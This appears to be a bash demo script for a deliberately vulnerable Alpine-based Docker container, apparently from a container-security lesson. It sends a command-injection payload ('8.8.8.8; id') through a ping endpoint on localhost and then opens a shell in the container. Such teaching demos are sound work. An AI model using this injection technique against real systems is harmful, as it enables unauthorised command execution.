#!/usr/bin/env bash
# Run from inside the 02-demo-alpine/ folder.
# Build: docker build -f Dockerfile -t 02-demo-alpine ..
# Run:   docker run -d --name 02-demo-alpine -p 5002:5000 02-demo-alpine

set -euo pipefail

TARGET="http://localhost:5002"
sep() { echo; echo "─────────────────────────────────────────────"; }

sep
echo "STEP 1: Package count"
docker exec 02-demo-alpine apk list 2>/dev/null | wc -l

sep
echo "STEP 2: Normal ping"
curl -s "$TARGET/ping?host=8.8.8.8" | python3 -m json.tool

sep
echo "STEP 3: Exploit -- command injection"
echo "        Payload: ?host=8.8.8.8; id"
curl -s "$TARGET/ping?host=8.8.8.8%3B+id" | python3 -m json.tool

sep
echo "STEP 4: Shell present"
docker exec 02-demo-alpine ls -la /bin/sh

sep
echo "STEP 5: Drop into a shell"
docker exec -it 02-demo-alpine /bin/sh
